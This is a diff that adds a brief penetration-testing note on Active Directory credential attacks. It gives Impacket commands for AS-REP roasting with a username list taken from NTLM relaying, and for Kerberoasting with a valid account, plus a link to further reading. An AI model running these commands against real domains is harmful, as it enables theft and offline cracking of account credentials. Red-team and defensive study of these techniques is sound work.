@@ -1,0 +1,12 @@
+# ASREProast with a list of usernames from ntlmrelayx or other methods. If you relayed credentials to the domain controller through ldaps (1.impacket), you should have a list of users to try.
+
+python3 ~path-to-impacket/examples/GetNPUsers.py -usersfile <username.list> 
+
+# Kerberoasting using a valid username and password, or ntlm hash.
+
+python3 ~path-to-impacket/examples/GetUserSPNs.py -request -dc-ip <domain.controller.ip> <domain>/<user>
+
+# Futher reading
+# 
+# Kerberos attacks
+# https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#file-kerberos_attacks_cheatsheet-md
